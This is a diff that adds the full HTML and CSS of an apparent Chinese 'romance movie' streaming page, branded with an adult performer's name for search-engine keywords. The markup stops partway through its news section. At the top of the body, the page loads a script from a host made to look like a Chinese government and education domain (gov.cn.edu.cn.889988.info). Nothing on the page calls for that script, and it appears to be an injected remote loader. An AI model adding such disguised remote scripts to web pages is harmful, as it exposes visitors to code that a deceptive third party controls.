@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>波多野结衣爱情电影网 - 爱情电影在线观看 | 浪漫影视精选</title>
+<meta name="description" content="波多野结衣爱情电影网，专注爱情电影、浪漫剧集、情感综艺与唯美动漫在线观看，海量爱情片单精心挑选，陪你度过每一个心动时刻。">
+<meta name="keywords" content="波多野结衣爱情电影网,爱情电影,浪漫电影,在线观看,爱情片,情感电影,浪漫剧集">
+<meta name="author" content="波多野结衣爱情电影网">
+<meta name="robots" content="index,follow">
+<meta name="theme-color" content="#1a0b2e">
+<meta property="og:title" content="波多野结衣爱情电影网 - 爱情电影在线观看">
+<meta property="og:description" content="海量爱情电影浪漫剧集在线观看，精心挑选陪你心动时刻">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://boduoyejieyiaiqingdianyingwang-wap.github.io">
+<link rel="canonical" href="https://boduoyejieyiaiqingdianyingwang-wap.github.io">
+<style>
+/* ============ Reset ============ */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:"Noto Sans CJK SC","PingFang SC","Microsoft YaHei",system-ui,sans-serif;background:#0f0717;color:#f6edf5;line-height:1.65;overflow-x:hidden}
+img{display:block;max-width:100%;height:auto}
+a{color:inherit;text-decoration:none;transition:color .25s,background .25s}
+ul,ol{list-style:none}
+button{font-family:inherit;cursor:pointer;border:none;background:none;color:inherit}
+.wrap{width:100%;max-width:1180px;margin:0 auto;padding:0 16px}
+
+/* ============ Tokens（玫瑰金·粉晶柔光） ============ */
+:root{
+  --rose:#ff5cae;--rose2:#c2185b;--gold:#f7c59f;--plum:#3d1b4e;
+  --bg:#0f0717;--bg2:#1d1029;--card:#241530;--line:rgba(255,92,174,.24);
+  --txt:#f6edf5;--mut:#b59cc4;
+}
+body{background:radial-gradient(circle at 12% 8%,rgba(255,92,174,.12),transparent 42%),radial-gradient(circle at 88% 90%,rgba(194,24,91,.12),transparent 40%),var(--bg)}
+
+/* ============ 顶部条 ============ */
+.xtop{background:linear-gradient(90deg,#1a0b2e,#2d1238,#1a0b2e);border-bottom:1px solid var(--line);font-size:12px}
+.xtop .wrap{display:flex;justify-content:space-between;height:36px;align-items:center}
+.xtop .l{display:flex;gap:18px}
+.xtop .l a{color:#e7c6e6;white-space:nowrap}
+.xtop .l a:hover{color:var(--gold)}
+.xtop .r{color:#cba6d8;font-size:11.5px;white-space:nowrap}
+
+/* ============ Header ============ */
+.hd{padding:22px 0;border-bottom:1px solid var(--line)}
+.hd-in{display:flex;align-items:center;gap:18px}
+.brand{display:flex;align-items:center;gap:14px;flex-shrink:0}
+.heart{width:52px;height:52px;border-radius:50%;background:linear-gradient(135deg,var(--rose),var(--rose2));display:grid;place-items:center;font-size:24px;box-shadow:0 8px 24px rgba(255,92,174,.4);flex-shrink:0}
+.brand b{font-size:25px;font-weight:900;letter-spacing:.5px;background:linear-gradient(90deg,#ff8dc7,var(--gold));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+.brand small{display:block;font-size:9.5px;letter-spacing:2.5px;color:var(--mut);text-transform:uppercase;margin-top:2px}
+.search{flex:1;max-width:360px;margin-left:auto;position:relative}
+.search input{width:100%;height:42px;border:1px solid var(--line);background:rgba(255,92,174,.06);padding:0 48px 0 18px;color:var(--txt);font-size:13.5px;outline:none;transition:.25s}
+.search input::placeholder{color:var(--mut)}
+.search input:focus{border-color:var(--rose);background:rgba(255,92,174,.13)}
+.search button{position:absolute;right:5px;top:5px;width:32px;height:32px;background:linear-gradient(135deg,var(--rose),var(--rose2));color:#fff;border-radius:50%;font-size:14px}
+.h-act{display:flex;gap:10px;flex-shrink:0}
+.h-act a{font-size:12.5px;font-weight:700;padding:9px 18px;border-radius:22px;border:1px solid var(--line);color:#f0d4ee}
+.h-act a.on{background:linear-gradient(135deg,var(--rose),var(--rose2));border-color:transparent;color:#fff}
+.h-act a:hover{background:rgba(255,92,174,.15)}
+
+/* ============ Nav ============ */
+.nav{position:sticky;top:0;z-index:100;background:rgba(15,7,23,.94);backdrop-filter:blur(12px);border-bottom:1px solid var(--line)}
+.nav-in{display:flex;gap:2px;overflow-x:auto;scrollbar-width:none}
+.nav-in::-webkit-scrollbar{display:none}
+.nav-in a{padding:15px 19px;font-size:13.5px;font-weight:700;color:var(--mut);white-space:nowrap;position:relative}
+.nav-in a:hover,.nav-in a.active{color:#fff}
+.nav-in a.active{background:linear-gradient(180deg,transparent,rgba(255,92,174,.12))}
+.nav-in a.active::after{content:"";position:absolute;left:50%;bottom:6px;transform:translateX(-50%);width:20px;height:3px;border-radius:2px;background:linear-gradient(90deg,var(--rose),var(--gold))}
+
+/* ============ 通用 ============ */
+.sec{padding:44px 0}
+.sec-h{display:flex;align-items:center;gap:12px;margin-bottom:24px;flex-wrap:wrap}
+.sec-h .ic{width:34px;height:34px;border-radius:50%;background:linear-gradient(135deg,var(--rose),var(--rose2));display:grid;place-items:center;font-size:15px;flex-shrink:0}
+.sec-h h3{font-size:22px;font-weight:900}
+.sec-h h3 em{font-style:normal;background:linear-gradient(90deg,var(--rose),var(--gold));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+.sec-h .more{margin-left:auto;font-size:12.5px;color:var(--mut)}
+.sec-h .more:hover{color:var(--rose)}
+
+/* ============ Hero（对角斜切 + 双栏） ============ */
+.hero{position:relative;padding:52px 0;border-bottom:1px solid var(--line);overflow:hidden}
+.hero::before{content:"";position:absolute;right:-120px;top:-80px;width:420px;height:420px;background:radial-gradient(circle,rgba(255,92,174,.18),transparent 65%);border-radius:50%}
+.hero::after{content:"";position:absolute;left:-100px;bottom:-140px;width:360px;height:360px;background:radial-gradient(circle,rgba(247,197,159,.10),transparent 65%);border-radius:50%}
+.hero-in{position:relative;display:grid;grid-template-columns:1fr 1fr;gap:40px;align-items:center}
+.hero-txt .eyebrow{display:inline-block;font-size:11px;font-weight:800;letter-spacing:2px;color:var(--gold);border:1px solid rgba(247,197,159,.4);padding:5px 14px;border-radius:20px;margin-bottom:18px}
+.hero-txt h2{font-size:clamp(30px,5.4vw,52px);line-height:1.2;font-weight:900}
+.hero-txt h2 .grad{background:linear-gradient(90deg,#ff8dc7,var(--gold));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+.hero-txt p{margin-top:18px;color:#e2c8e6;font-size:15px;max-width:470px}
+.h-acts{display:flex;gap:14px;margin-top:28px;flex-wrap:wrap}
+.btn{border-radius:24px;padding:13px 30px;font-size:13.5px;font-weight:800;transition:.3s;display:inline-block}
+.btn-rose{background:linear-gradient(135deg,var(--rose),var(--rose2));color:#fff;box-shadow:0 10px 28px rgba(255,92,174,.38)}
+.btn-rose:hover{transform:translateY(-3px);box-shadow:0 14px 34px rgba(255,92,174,.5)}
+.btn-ghost{border:1px solid var(--line);color:#f0d4ee}
+.btn-ghost:hover{background:rgba(255,92,174,.12)}
+.hero-stat{display:flex;gap:30px;margin-top:32px;flex-wrap:wrap}
+.hero-stat div span{display:block;font-size:26px;font-weight:900;color:var(--gold)}
+.hero-stat div small{font-size:11.5px;color:var(--mut)}
+/* Hero 右侧：大斜切封面 */
+.hero-cv{position:relative;border-radius:22px;overflow:hidden;border:1px solid var(--line);aspect-ratio:4/5;clip-path:polygon(0 0,100% 6%,100% 100%,0 94%);box-shadow:0 24px 60px rgba(255,92,174,.22)}
+.hero-cv img{width:100%;height:100%;object-fit:cover}
+.hero-cv::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,transparent 45%,rgba(15,7,23,.94))}
+.hero-cv .cap{position:absolute;left:24px;right:24px;bottom:24px;z-index:1}
+.hero-cv .cap .nm{font-size:11px;color:var(--gold);letter-spacing:2px;font-weight:800}
+.hero-cv .cap h4{font-size:24px;font-weight:900;margin:6px 0}
+.hero-cv .cap .tg{display:flex;gap:8px;flex-wrap:wrap;margin-top:10px}
+.hero-cv .cap .tg i{font-style:normal;font-size:11px;padding:4px 11px;border-radius:20px;background:rgba(255,255,255,.14);border:1px solid rgba(255,255,255,.22)}
+.hero-cv .badge{position:absolute;top:20px;right:20px;z-index:1;background:linear-gradient(135deg,var(--rose),var(--rose2));color:#fff;font-size:11px;font-weight:900;padding:7px 14px;border-radius:20px}
+
+/* ============ 爱情电影（封面轮播卡） ============ */
+.love{display:grid;grid-template-columns:repeat(auto-fill,minmax(210px,1fr));gap:20px}
+.lv{position:relative;border-radius:16px;overflow:hidden;background:var(--card);border:1px solid var(--line);transition:.4s}
+.lv:hover{transform:translateY(-10px) rotate(-1deg);box-shadow:0 22px 44px rgba(255,92,174,.3)}
+.lv-cv{position:relative;aspect-ratio:3/4;overflow:hidden}
+.lv-cv img{width:100%;height:100%;object-fit:cover;transition:transform .75s}
+.lv:hover .lv-cv img{transform:scale(1.13)}
+.lv-cv .rate{position:absolute;top:12px;left:12px;font-size:11px;font-weight:900;background:rgba(15,7,23,.82);border:1px solid var(--gold);color:var(--gold);padding:4px 10px;border-radius:20px}
+.lv-cv .like{position:absolute;top:12px;right:12px;width:34px;height:34px;border-radius:50%;background:rgba(15,7,23,.7);display:grid;place-items:center;font-size:14px;border:1px solid var(--line);transition:.3s}
+.lv:hover .like{background:var(--rose);border-color:var(--rose)}
+.lv-cv .hov{position:absolute;inset:auto 0 0 0;padding:14px;background:linear-gradient(0deg,rgba(15,7,23,.96),transparent);display:flex;gap:8px;opacity:0;transform:translateY(12px);transition:.35s}
+.lv:hover .hov{opacity:1;transform:translateY(0)}
+.lv-cv .hov a{flex:1;text-align:center;font-size:12px;font-weight:800;padding:8px;border-radius:20px;background:var(--rose);color:#fff}
+.lv-cv .hov a.gh{background:rgba(255,255,255,.16);color:#fff}
+.lv-b{padding:14px 16px}
+.lv-b h4{font-size:15px;font-weight:700}
+.lv-b .meta{font-size:11.5px;color:var(--mut);margin-top:6px;display:flex;justify-content:space-between;border-top:1px solid var(--line);padding-top:8px;margin-top:10px}
+
+/* ============ 爱情剧集（左图右列表） ============ */
+.ldr{display:grid;grid-template-columns:1.05fr 1fr;gap:22px;background:var(--card);border:1px solid var(--line);border-radius:20px;overflow:hidden}
+.ldr-f{position:relative;min-height:380px}
+.ldr-f img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover}
+.ldr-f::after{content:"";position:absolute;inset:0;background:linear-gradient(0deg,rgba(15,7,23,.96),transparent 55%)}
+.ldr-f .txt{position:absolute;left:22px;right:22px;bottom:22px;z-index:1}
+.ldr-f .txt .k{font-size:11px;color:var(--gold);font-weight:800;letter-spacing:1.5px}
+.ldr-f .txt h4{font-size:22px;font-weight:900;margin:6px 0}
+.ldr-f .txt p{font-size:12.5px;color:#e2c8e6}
+.ldr-l{display:flex;flex-direction:column}
+.ldr-l .row{display:grid;grid-template-columns:44px 1fr auto;gap:14px;align-items:center;padding:15px 20px;border-bottom:1px solid var(--line);transition:.25s}
+.ldr-l .row:last-child{border-bottom:none}
+.ldr-l .row:hover{background:rgba(255,92,174,.08)}
+.ldr-l .num{width:40px;height:40px;border-radius:12px;display:grid;place-items:center;font-size:13px;font-weight:900;background:linear-gradient(135deg,var(--rose),var(--rose2));color:#fff}
+.ldr-l strong{font-size:14px;font-weight:600;display:block}
+.ldr-l small{font-size:11.5px;color:var(--mut)}
+.ldr-l .st{font-size:11px;color:var(--gold);font-weight:700;white-space:nowrap}
+
+/* ============ 情感综艺（时间轴竖线） ============ */
+.variety{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:24px}
+.va{position:relative;padding-left:24px;border-left:2px solid var(--line);transition:.3s}
+.va:hover{border-left-color:var(--rose)}
+.va::before{content:"";position:absolute;left:-7px;top:6px;width:12px;height:12px;border-radius:50%;background:var(--plum);border:2px solid var(--rose)}
+.va:hover::before{background:var(--rose);box-shadow:0 0 0 5px rgba(255,92,174,.22)}
+.va .dt{font-size:11px;color:var(--gold);font-weight:800;letter-spacing:1.5px}
+.va h4{font-size:16.5px;font-weight:800;margin:8px 0}
+.va p{font-size:13px;color:#d8bfdd}
+.va .cn{display:flex;gap:8px;margin-top:12px;flex-wrap:wrap}
+.va .cn span{font-size:10.5px;padding:4px 11px;border-radius:20px;background:rgba(255,92,174,.1);color:#f0c4e0;border:1px solid var(--line)}
+
+/* ============ 动漫（横向滑动宽卡） ============ */
+.rail{position:relative}
+.rail-track{display:flex;gap:16px;overflow-x:auto;padding:4px 4px 16px;scrollbar-width:thin;scrollbar-color:rgba(255,92,174,.35) transparent}
+.rail-track::-webkit-scrollbar{height:7px}
+.rail-track::-webkit-scrollbar-thumb{background:rgba(255,92,174,.35);border-radius:4px}
+.aw{position:relative;flex:0 0 320px;border-radius:18px;overflow:hidden;border:1px solid var(--line);transition:.35s}
+.aw:hover{border-color:var(--rose);transform:translateY(-6px)}
+.aw img{width:100%;height:190px;object-fit:cover;transition:transform .65s}
+.aw:hover img{transform:scale(1.09)}
+.aw .aw-t{padding:14px 16px;background:var(--card)}
+.aw .aw-t h4{font-size:15px;font-weight:700}
+.aw .aw-t .line{font-size:11.5px;color:var(--mut);margin-top:5px;display:flex;gap:10px}
+.aw .aw-t .line i{font-style:normal;padding:2px 9px;border-radius:20px;background:rgba(255,92,174,.12);color:#f0c4e0}
+.aw .heart-ic{position:absolute;top:12px;right:12px;width:34px;height:34px;border-radius:50%;background:rgba(15,7,23,.72);display:grid;place-items:center;font-size:13px;border:1px solid var(--line);z-index:1}
+
+/* ============ 资讯（卡片式） ============ */
+.news{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:20px}
+.nw{background:var(--card);border:1px solid var(--line);border-radius:18px;overflow:hidden;transition:.35s;display:flex;flex-direction:column}
+.nw:hover{transform:translateY(-8px);box-shadow:0 18px 38px rgba(255,92,174,.24)}
+.nw img{width:100%;height:190px;object-fit:cover;transition:transform .65s}
+.nw:hover img{transform:scale(1.08)}
+.nw-b{flex:1;padding:18px 20px;display:flex;flex-direction:column}
+.nw .cat{font-size:10.5px;font-weight:800;letter-spacing:1.5px;color:var(--gold)}
+.nw h4{font-size:16px;font-weight:800;line-height:1.5;margin:9px 0;flex:1}
+.nw h4:hover{color:var(--rose)}
+.nw .bot{display:flex;justify-content:space-between;font-size:11.5px;color:var(--mut);border-top:1px solid var(--line);padding-top:11px;margin-top:8px}
+
+/* ============ 榜单（分层堆叠） ============ */
+.rank{display:grid;grid-template-columns:1fr 1fr;gap:22px}
+.rk{background:linear-gradient(160deg,var(--card),var(--bg2));border:1px solid var(--line);border-radius:20px;padding:22px}
+.rk-h{display:flex;align-items:center;gap:10px;margin-bottom:18px}
+.rk-h b{font-size:15px;font-weight:900}
+.rk-h span{font-size:11px;color:var(--mut)}
+.rk li{display:flex;gap:14px;align-items:flex-start;padding:12px 0;border-bottom:1px dashed var(--line)}
+.rk li:last-child{border-bottom:none}
+.rk .idx{font-size:13px;font-weight:900;width:30px;height:30px;border-radius:50%;display:grid;place-items:center;flex-shrink:0;background:rgba(255,92,174,.14);color:var(--rose)}
+.rk .idx.t{background:linear-gradient(135deg,var(--rose),var(--rose2));color:#fff}
+.rk .cv{width:78px;height:104px;border-radius:10px;overflow:hidden;flex-shrink:0;border:1px solid var(--line)}
+.rk .cv img{width:100%;height:100%;object-fit:cover}
+.rk .info{flex:1}
+.rk .info h4{font-size:14px;font-weight:700}
+.rk .info p{font-size:11.5px;color:var(--mut);margin-top:4px}
+.rk .info .sc{font-size:12px;color:var(--gold);font-weight:800;margin-top:7px}
+
+/* ============ 分类（花瓣形） ============ */
+.cat{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.cat a{position:relative;border-radius:20px;overflow:hidden;min-height:130px;display:grid;place-items:center;text-align:center;transition:.4s;border:1px solid var(--line)}
+.cat a::before{content:"";position:absolute;inset:0;background-image:var(--bgimg);background-size:cover;background-position:center;filter:brightness(.42) saturate(1.25)}
+.cat a::after{content:"";position:absolute;inset:0;background:linear-gradient(150deg,rgba(255,92,174,.55),rgba(194,24,91,.5))}
+.cat a span{position:relative;z-index:1}
+.cat a b{display:block;font-size:20px;font-weight:900}
+.cat a i{font-style:normal;font-size:11.5px;color:#fbe6f2}
+.cat a:hover{transform:scale(1.05) rotate(1deg)}
+.cat a:hover::after{background:linear-gradient(150deg,rgba(247,197,159,.55),rgba(255,92,174,.55))}
+
+/* ============ 观众心声（引言块） ============ */
+.quote{background:linear-gradient(160deg,#241530,#1d1029);border:1px solid var(--line);border-radius:22px;padding:36px;text-align:center;position:relative}
+.quote::before{content:"“";position:absolute;top:-10px;left:24px;font-size:80px;line-height:.8;color:var(--rose);opacity:.4}
+.quote p{font-size:17px;font-weight:600;max-width:720px;margin:0 auto;line-height:1.85}
+.quote .who{margin-top:20px;font-size:12.5px;color:var(--gold);font-weight:800;letter-spacing:1.5px}
+
+/* ============ CTA ============ */
+.cta{margin:46px 0;padding:50px 24px;border-radius:24px;text-align:center;position:relative;overflow:hidden;border:1px solid var(--line);background:linear-gradient(135deg,#3d1b4e,#1a0b2e)}
+.cta::before{content:"";position:absolute;inset:0;background:radial-gradient(circle at 50% 120%,rgba(255,92,174,.28),transparent 60%)}
+.cta>*{position:relative;z-index:1}
+.cta h3{font-size:clamp(23px,4.2vw,34px);font-weight:900}
+.cta h3 em{font-style:normal;background:linear-gradient(90deg,#ff8dc7,var(--gold));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+.cta p{color:#e2c8e6;font-size:14px;max-width:520px;margin:12px auto 26px}
+.cta .btn-rose{padding:14px 42px;font-size:14.5px}
+
+/* ============ Footer ============ */
+.ft{background:#0a0412;border-top:1px solid var(--line);padding:46px 0 24px;margin-top:24px}
+.ft-g{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:30px;margin-bottom:30px}
+.ft-c h5{font-size:12.5px;font-weight:900;color:var(--gold);margin-bottom:16px;letter-spacing:1.5px}
+.ft-c ul li{margin-bottom:11px}
+.ft-c a{font-size:13px;color:var(--mut)}
+.ft-c a:hover{color:var(--rose)}
+.ft-ab .brand{margin-bottom:14px}
+.ft-ab p{font-size:13px;color:var(--mut);line-height:1.9}
+.ft-bot{border-top:1px solid var(--line);padding-top:20px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px}
+.ft-bot p{font-size:12px;color:#7a6090}
+.ft-bot .lk a{font-size:12px;color:#7a6090;margin-left:18px}
+.ft-bot .lk a:hover{color:var(--rose)}
+
+/* ============ 移动端 ============ */
+@media(max-width:900px){
+  .hero-in{grid-template-columns:1fr;gap:30px}
+  .hero-cv{aspect-ratio:5/4;max-width:480px}
+  .ldr{grid-template-columns:1fr}
+  .ldr-f{min-height:300px}
+  .rank{grid-template-columns:1fr}
+  .xtop .l{display:none}
+  .h-act{display:none}
+  .search{margin-left:0}
+}
+@media(max-width:560px){
+  .love,.nw{grid-template-columns:repeat(2,1fr);gap:13px}
+  .cat,.variety{grid-template-columns:repeat(2,1fr)}
+  .cat a{min-height:104px}
+  .ft-g{grid-template-columns:1fr 1fr}
+  .sec{padding:34px 0}
+  .cta{padding:34px 16px}
+  .hero-txt h2{font-size:32px}
+  .hd-in{gap:12px}
+  .nav-in a{padding:13px 14px;font-size:13px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<!-- 顶部条 -->
+<div class="xtop">
+  <div class="wrap"><span class="l"><a href="#">📱 手机版</a><a href="#">💌 收藏本站</a><a href="#">📮 意见反馈</a></span><span class="r">用心挑选每一部爱情片 · 陪你心动的每一刻</span></div>
+</div>
+
+<!-- Header -->
+<header class="hd">
+  <div class="wrap hd-in">
+    <a class="brand" href="#"><span class="heart">💗</span><div><b>波多野结衣爱情电影网</b><small>LOVE ROMANCE CINEMA</small></div></a>
+    <div class="search"><input type="search" placeholder="搜爱情片 / 演员 / 导演..." aria-label="搜索"><button aria-label="搜索">🔍</button></div>
+    <div class="h-act"><a href="#">登录</a><a class="on" href="#">免费注册</a></div>
+  </div>
+</header>
+
+<!-- Nav -->
+<nav class="nav" aria-label="主导航">
+  <div class="wrap nav-in">
+    <a href="#" class="active">首页</a><a href="#love">爱情电影</a><a href="#tv">爱情剧集</a><a href="#variety">情感综艺</a><a href="#ani">浪漫动漫</a><a href="#news">影视资讯</a><a href="#rank">心动榜单</a><a href="#cat">类型分类</a><a href="#about">关于我们</a>
+  </div>
+</nav>
+
+<main>
+
+  <!-- Hero -->
+  <section class="hero">
+    <div class="wrap hero-in">
+      <div class="hero-txt">
+        <span class="eyebrow">ROMANCE · 2026</span>
+        <h2>每一帧<br>都是<wbr><span class="grad">心动</span>的模样</h2>
+        <p>波多野结衣爱情电影网，专注爱情电影与浪漫影视内容。从怦然心动到细水长流，海量爱情片单精心挑选，陪你度过每一个值得纪念的时刻。</p>
+        <div class="h-acts"><a class="btn btn-rose" href="#love">开始观影</a><a class="btn btn-ghost" href="#rank">看心动榜</a></div>
+        <div class="hero-stat">
+          <div><span>8,600+</span><small>爱情片库</small></div>
+          <div><span>1,200+</span><small>浪漫剧集</small></div>
+          <div><span>每日</span><small>精选更新</small></div>
+        </div>
+      </div>
+      <div class="hero-cv"><img src="https://images.unsplash.com/photo-1502230831726-fe5549140034?w=600&q=70" alt="今日推荐封面" loading="lazy"><span class="badge">❤ 今日推荐</span><div class="cap"><span class="nm">本周精选</span><h4>怦然再心动</h4><div class="tg"><i>爱情</i><i>都市</i><i>治愈</i></div></div></div>
+    </div>
+  </section>
+
+  <!-- 爱情电影 -->
+  <section class="sec" id="love">
+    <div class="wrap">
+      <div class="sec-h"><span class="ic">💕</span><h3><em>爱情电影</em>精选</h3><a class="more" href="#">全部爱情片 ›</a></div>
+      <div class="love">
+        <article class="lv"><div class="lv-cv"><img src="https://images.unsplash.com/photo-1502230831726-fe5549140034?w=400&q=70" alt="爱情电影海报" loading="lazy"><span class="rate">★ 8.9</span><span class="like">♡</span><div class="hov"><a href="#">立即观看</a><a class="gh" href="#">详情</a></div></div><div class="lv-b"><h4>怦然心动</h4><div class="meta"><span>爱情 · 青春</span><span>2010</span></div></div></article>
+        <article class="lv"><div class="lv-cv"><img src="https://images.unsplash.com/photo-1518199266791-5375d97afc65?w=400&q=70" alt="爱情电影海报" loading="lazy"><span class="rate">★ 9.1</span><span class="like">♡</span><div class="hov"><a href="#">立即观看</a><a class="gh" href="#">详情</a></div></div><div class="lv-b"><h4>爱在黎明破晓前</h4><div class="meta"><span>爱情 · 文艺</span><span>1995</span></div></div></article>
+        <article class="lv"><div class="lv-cv"><img src="https://images.unsplash.com/photo-1520637836862-4d197d17c73a?w=400&q=70" alt="爱情电影海报" loading="lazy"><span class="rate">★ 8.6</span><span class="like">♡</span><div class="hov"><a href="#">立即观看</a><a class="gh" href="#">详情</a></div></div><div class="lv-b"><h4>你的名字</h4><div class="meta"><span>爱情 · 动画</span><span>2016</span></div></div></article>
+        <article class="lv"><div class="lv-cv"><img src="https://images.unsplash.com/photo-1478720568477-152d9b164e26?w=400&q=70" alt="爱情电影海报" loading="lazy"><span class="rate">★ 8.4</span><span class="like">♡</span><div class="hov"><a href="#">立即观看</a><a class="gh" href="#">详情</a></div></div><div class="lv-b"><h4>泰坦尼克号</h4><div class="meta"><span>爱情 · 灾难</span><span>1997</span></div></div></article>
+        <article class="lv"><div class="lv-cv"><img src="https://images.unsplash.com/photo-1500462918059-b1a0cb512f1d?w=400&q=70" alt="爱情电影海报" loading="lazy"><span class="rate">★ 8.7</span><span class="like">♡</span><div class="hov"><a href="#">立即观看</a><a class="gh" href="#">详情</a></div></div><div class="lv-b"><h4>情书</h4><div class="meta"><span>爱情 · 纯爱</span><span>1995</span></div></div></article>
+        <article class="lv"><div class="lv-cv"><img src="https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=400&q=70" alt="爱情电影海报" loading="lazy"><span class="rate">★ 8.5</span><span class="like">♡</span><div class="hov"><a href="#">立即观看</a><a class="gh" href="#">详情</a></div></div><div class="lv-b"><h4>爱乐之城</h4><div class="meta"><span>爱情 · 歌舞</span><span>2016</span></div></div></article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 爱情剧集 -->
+  <section class="sec" id="tv">
+    <div class="wrap">
+      <div class="sec-h"><span class="ic">🌹</span><h3>热门<em>爱情剧集</em></h3><a class="more" href="#">更多剧集 ›</a></div>
+      <div class="ldr">
+        <div class="ldr-f"><img src="https://images.unsplash.com/photo-1518199266791-5375d97afc65?w=600&q=70" alt="剧集主视觉" loading="lazy"><div class="txt"><span class="k">EDITOR'S PICK</span><h4>何以笙箫默</h4><p>七年后重逢，沉默寡言的何以琛终于等到他的不二之臣，一段深情等待终得回响。</p></div></div>
+        <div class="ldr-l">
+          <div class="row"><span class="num">01</span><div><strong>何以笙箫默</strong><small>都市 · 爱情 · 全32集</small></div><span class="st">更新至32集</span></div>
+          <div class="row"><span class="num">02</span><div><strong>下一站是幸福</strong><small>都市 · 职场 · 全41集</small></div><span class="st">更新至41集</span></div>
+          <div class="row"><span class="num">03</span><div><strong>致我们暖暖的小时光</strong><small>青春 · 校园 · 全24集</small></div><span class="st">更新至24集</span></div>
+          <div class="row"><span class="num">04</span><div><strong>我可能不会爱你</strong><small>都市 · 治愈 · 全24集</small></div><span class="st">更新至24集</span></div>
+          <div class="row"><span class="num">05</span><div><strong>匆匆那年</strong><small>青春 · 怀旧 · 全16集</small></div><span class="st">更新至16集</span></div>
+          <div class="row"><span class="num">06</span><div><strong>没关系，是爱情啊</strong><small>都市 · 治愈 · 全20集</small></div><span class="st">更新至20集</span></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 情感综艺 -->
+  <section class="sec" id="variety">
+    <div class="wrap">
+      <div class="sec-h"><span class="ic">💌</span><h3>情感<em>综艺</em></h3><a class="more" href="#">更多综艺 ›</a></div>
+      <div class="variety">
+        <article class="va"><span class="dt">2026 · 热播中</span><h4>心动的信号</h4><p>素人单身男女同居相处，观察员破解心动密码，真实情感扑面而来。</p><div class="cn"><span>恋爱观察</span><span>素人</span></div></article>
+        <article class="va"><span class="dt">2026 · 热播中</span><h4>半熟恋人</h4><p>30+都市男女的情感碰撞，成年人的爱情更懂分寸与真诚。</p><div class="cn"><span>都市恋爱</span><span>熟龄</span></div></article>
+        <article class="va"><span class="dt">2026 · 新上线</span><h4>我们相爱吧</h4><p>明星假想恋爱真人秀，甜蜜互动全程高能，甜度超标。</p><div class="cn"><span>明星恋爱</span><span>甜蜜</span></div></article>
+        <article class="va"><span class="dt">2026 · 热播中</span><h4>再见爱人</h4><p>婚姻纪实观察，坦诚面对关系裂痕，给爱情一次重新选择的机会。</p><div class="cn"><span>婚姻纪实</span><span>情感观察</span></div></article>
+        <article class="va"><span class="dt">2026 · 新上线</span><h4>春日迟迟再出发</h4><p>离异男女重启恋爱之旅，治愈与勇气并存的心动故事。</p><div class="cn"><span>治愈</span><span>再出发</span></div></article>
+        <article class="va"><span class="dt">2026 · 热播中</span><h4>女儿们的恋爱</h4><p>父亲观察女儿的恋爱现场，亲情与爱情的温暖碰撞。</p><div class="cn"><span>亲情观察</span><span>恋爱</span></div></article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 动漫 -->
+  <section class="sec" id="ani">
+    <div class="wrap">
+      <div class="sec-h"><span class="ic">🌸</span><h3>浪漫<em>动漫</em>追更</h3><a class="more" href="#">更多动漫 ›</a></div>
+      <div class="rail">
+        <div class="rail-track">
+          <article class="aw"><span class="heart-ic">💗</span><img src="https://images.unsplash.com/photo-1520637836862-4d197d17c73a?w=400&q=70" alt="动漫封面" loading="lazy"><div class="aw-t"><h4>你的名字</h4><div class="line"><i>剧场版</i><span>纯爱 · 奇幻</span></div></div></article>
+          <article class="aw"><span class="heart-ic">💗</span><img src="https://images.unsplash.com/photo-1500462918059-b1a0cb512f1d?w=400&q=70" alt="动漫封面" loading="lazy"><div class="aw-t"><h4>元气少女缘结神</h4><div class="line"><i>TV</i><span>神隐 · 甜宠</span></div></div></article>
+          <article class="aw"><span class="heart-ic">💗</span><img src="https://images.unsplash.com/photo-1578632767115-351597cf2477?w=400&q=70" alt="动漫封面" loading="lazy"><div class="aw-t"><h4>辉夜大小姐想让我告白</h4><div class="line"><i>TV</i><span>校园 · 智斗恋爱</span></div></div></article>
+          <article class="aw"><span class="heart-ic">💗</span><img src="https://images.unsplash.com/photo-1607604276583-eef5d076aa5f?w=400&q=70" alt="动漫封面" loading="lazy"><div class="aw-t"><h4>堀与宫村</h4><div class="line"><i>TV</i><span>校园 · 纯爱</span></div></div></article>
+          <article class="aw"><span class="heart-ic">💗</span><img src="https://images.unsplash.com/photo-1560972550-aba3456b566a?w=400&q=70" alt="动漫封面" loading="lazy"><div class="aw-t"><h4>紫罗兰永恒花园</h4><div class="line"><i>TV</i><span>治愈 · 唯美</span></div></div></article>
+          <article class="aw"><span class="heart-ic">💗</span><img src="https://images.unsplash.com/photo-1613376023733-ba36b32e7a54?w=400&q=70" alt="动漫封面" loading="lazy"><div class="aw-t"><h4>月刊少女野崎君</h4><div class="line"><i>TV</i><span>校园 · 搞笑恋爱</span></div></div></article>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 资讯 -->
+  <section class="sec" id="news">
+    <div class="wrap">
+      <div class="sec-h"><span class="ic">🕊️</span><h3>影视<em>资讯</em></h3><a class="more" href="#">全部资讯 ›</a></div>
+      <div class="news">
